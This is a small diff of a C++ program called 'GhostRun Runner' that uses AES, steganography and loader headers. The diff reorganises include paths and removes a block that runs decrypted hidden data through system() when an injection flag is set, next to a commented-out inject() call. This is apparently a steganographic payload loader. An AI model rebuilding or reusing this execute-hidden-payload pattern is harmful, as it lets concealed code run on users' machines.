@@ -1,9 +1,8 @@
 #include <iostream>
-#include <aes.hpp>
-#include <steg.hpp>
-#include <utils.hpp>
-
-#include "loader.hpp"
+#include <aes/aes.hpp>
+#include <steg/steg.hpp>
+#include <utils/utils.hpp>
+#include <loader/loader.hpp>
 
 int main(int argc, char* argv[]) {
     std::cout << "GhostRun Runner" << std::endl;
@@ -23,11 +22,6 @@ int main(int argc, char* argv[]) {
         for (const auto& c : decryptedData)
         {
             std::cout << c;
-        }
-        if (encryptedData.injectionFlag)
-        {
-            system(decryptedDataString.c_str());
-            //inject(decryptedDataString);
         }
     }
     catch (std::exception& e)
